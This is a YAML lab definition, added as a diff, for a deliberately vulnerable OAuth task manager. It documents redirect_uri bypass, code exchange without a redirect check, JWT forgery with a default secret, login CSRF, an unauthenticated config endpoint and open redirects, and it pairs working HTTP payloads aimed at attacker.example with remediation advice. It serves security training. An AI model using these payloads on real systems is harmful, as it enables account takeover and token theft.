@@ -1,0 +1,213 @@
+id: vt-damnvulnerableapp
+
+info:
+  name: "Damn Vulnerable App - OAuth Task Manager"
+  author: omarkurt
+  description: |
+    A deliberately vulnerable multi-tenant task manager that signs users in through its own
+    OAuth 2.0 server, written by xssdoctor. Three services run in one container: the OAuth
+    server, the task manager app and a tracker iframe. The lab covers OAuth flaws that are
+    rare in other training apps: a redirect_uri check that can be bypassed, a code exchange
+    that ignores redirect_uri, an unbound state parameter, a guessable JWT signing secret,
+    open redirects, an unauthenticated configuration endpoint and pages that any site can frame.
+    Chained together they lead to a full takeover of another tenant.
+  type: Lab
+  difficulty: Medium
+  targets:
+    - nodejs
+    - express
+    - react
+    - oauth2
+  tags:
+    - oauth
+    - jwt
+    - open-redirect
+    - csrf
+    - clickjacking
+    - multi-tenant
+    - broken-authentication
+    - nodejs
+  references:
+    - https://vulnerabletarget.com/VT-DAMNVULNERABLEAPP
+    - https://github.com/xssdoctor/damnvulnerableapp
+
+vulnerabilities:
+  - id: redirect_uri_bypass
+    name: "redirect_uri validation bypass leaks the authorization code"
+    description: |
+      For the built-in task-app client the OAuth server accepts any redirect_uri that matches
+      ^https?://((.*\.)?localhost(:port)?|localhost(:port)?)/oauth/.*$. The unanchored (.*\.)
+      also matches "attacker.example#." or "attacker.example?.", so the browser goes to
+      attacker.example with a valid code. A plain attacker host is rejected.
+    endpoint: /authorize
+    method: GET
+    param: redirect_uri
+    request: |
+      GET /authorize?client_id=task-app&response_type=code&scope=name%20email&prompt=none&state=s1&redirect_uri=http://attacker.example%23.localhost/oauth/x HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: oauth_session={{victim_oauth_session}}
+    response: |
+      HTTP/1.1 302 Found
+      Location: http://attacker.example/?code=eNS-l6KJrIlg-YdixslQiKZ-4w9b88Rs&state=s1#.localhost/oauth/x
+  - id: token_exchange_no_redirect_check
+    name: "Code exchange does not check redirect_uri"
+    description: |
+      POST /token redeems a code for any redirect_uri, or none at all. Together with the
+      client secret that ships with the app (task-secret), a stolen code becomes a token
+      for the victim.
+    endpoint: /token
+    method: POST
+    param: redirect_uri
+    request: |
+      POST /token HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      code={{stolen_code}}&client_id=task-app&client_secret=task-secret&redirect_uri=http://totally-different.example/
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
+  - id: jwt_default_secret
+    name: "JWT signed with the default secret"
+    description: |
+      Session tokens are HS256 JWTs signed with JWT_SECRET, which defaults to
+      dev-secret-change-me. Signing {"sub": "<victim user id>"} with it gives access to the
+      victim's tenant without a password. An invalid token is rejected with 401.
+    endpoint: /api/tasks
+    method: GET
+    param: task_auth_token
+    request: |
+      GET /api/tasks HTTP/1.1
+      Host: {{Hostname}}
+      Cookie: task_auth_token={{jwt_signed_with_dev-secret-change-me}}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"tenant":{"name":"bob-corp", ...},"tasks":[...]}
+  - id: login_csrf_state_unbound
+    name: "state is not bound to the session (login CSRF)"
+    description: |
+      /oauth/login only checks that state is valid base64. It is never compared with a value
+      stored for the browser, so an attacker can send a victim a link with the attacker's own
+      code and log the victim into the attacker's account.
+    endpoint: /oauth/login
+    method: GET
+    param: state
+    request: |
+      GET /oauth/login?code={{attacker_code}}&state=YXR0YWNrZXI= HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 302 Found
+      Location: /home
+      Set-Cookie: task_auth_token=...; Path=/; HttpOnly; SameSite=Lax
+  - id: unauth_oauth_config
+    name: "Unauthenticated OAuth configuration change"
+    description: |
+      POST /api/config/oauth changes the client id, client secret and the OAuth and app base
+      URLs without any session. Pointing oauthBaseUrl at an attacker host sends every later
+      login to a fake authorization server.
+    endpoint: /api/config/oauth
+    method: POST
+    param: oauthBaseUrl
+    request: |
+      POST /api/config/oauth HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/json
+
+      {"oauthBaseUrl":"http://attacker.example:9999"}
+    response: |
+      HTTP/1.1 200 OK
+      Content-Type: application/json; charset=utf-8
+
+      {"success":true,"clientId":"task-app","oauthAuthorizeUrl":"http://attacker.example:9999/authorize?client_id=task-app&..."}
+  - id: logout_open_redirect
+    name: "Open redirect on /logout"
+    description: |
+      /logout redirects to the returnTo parameter without checking it, no session needed.
+    endpoint: /logout
+    method: GET
+    param: returnTo
+    request: |
+      GET /logout?returnTo=https://attacker.example/phish HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 302 Found
+      Location: https://attacker.example/phish
+  - id: oauth_login_open_redirect
+    name: "Open redirect after OAuth sign-in"
+    description: |
+      The OAuth server's POST /login redirects to the returnTo field after a successful sign-in
+      without checking it.
+    endpoint: /login
+    method: POST
+    param: returnTo
+    request: |
+      POST /login HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+
+      email={{email}}&password={{password}}&returnTo=https://attacker.example/after-login
+    response: |
+      HTTP/1.1 302 Found
+      Location: https://attacker.example/after-login
+  - id: universal_framing
+    name: "OAuth pages can be framed by any site"
+    description: |
+      The OAuth server and the tracker send Content-Security-Policy: frame-ancestors * and no
+      X-Frame-Options, so the consent page can be framed for clickjacking.
+    endpoint: /authorize
+    method: GET
+    request: |
+      GET /authorize HTTP/1.1
+      Host: {{Hostname}}
+    response: |
+      HTTP/1.1 400 Bad Request
+      Content-Security-Policy: frame-ancestors *
+
+technical: |
+  The container runs three Express services (src/index.js): the OAuth server, the task
+  manager app with a React SPA, and a tracker iframe. All data is kept in memory.
+
+  - redirect_uri: src/oauth/server.js builds the fallback pattern for the built-in client as
+    ^https?://((.*\.)?<domain>(:[0-9]+)?|<domain>(:[0-9]+)?)/oauth/.*$ and tests it against
+    the decoded redirect_uri. "(.*\.)" accepts any prefix that ends with a dot, including a
+    host followed by # or ?.
+  - POST /token does not compare redirect_uri with the one used at /authorize ("No
+    redirect_uri validation at token exchange time per demo requirements").
+  - src/shared/jwt.js: JWT_SECRET falls back to 'dev-secret-change-me'. The image does not
+    set it.
+  - src/app/server.js /oauth/login only runs isValidBase64String(state).
+  - POST /api/config/oauth and GET /logout have no authentication.
+  - The OAuth server and tracker remove X-Frame-Options and set frame-ancestors *.
+
+  Not verified in this lab: the tracker iframe posts the parent's location.href to any
+  origin, which upstream describes as a way to leak implicit-flow tokens from the URL
+  fragment, and the admin upload keeps the original file name. Both need a browser to test.
+
+impact: |
+  An attacker who gets a signed-in victim to open one link receives an authorization code,
+  redeems it with the public client secret and holds a token for the victim's tenant. Knowing
+  a user id is enough to forge a token with the default JWT secret. The unauthenticated
+  config endpoint and open redirects make phishing the sign-in flow easy.
+
+remediation:
+  - "Compare redirect_uri with exact, pre-registered values, and require the same value at the token endpoint"
+  - "Bind state to the user's session and check it on the callback"
+  - "Set a long random JWT_SECRET and never ship a default"
+  - "Require admin authentication on /api/config/oauth"
+  - "Allow only relative or allow-listed targets in returnTo"
+  - "Send frame-ancestors 'self' (or X-Frame-Options: DENY) on the OAuth pages"
+
+providers:
+  docker-compose:
+    path: "docker-compose.yaml"
+
+post-install:
+  - "Task manager app: http://localhost:13000 (OAuth server: http://localhost:14000, tracker: http://localhost:15002/collector)"
+  - "Create a tenant admin at http://localhost:13000/signup, or POST /api/auth/admin/signup with name, email, username, password and organization"
+  - "OAuth dashboard for client settings: http://localhost:14000/dashboard"
+  - "All data is in memory; restarting the container resets users, tenants and tasks"
+  - "Built-in OAuth client: task-app / task-secret"
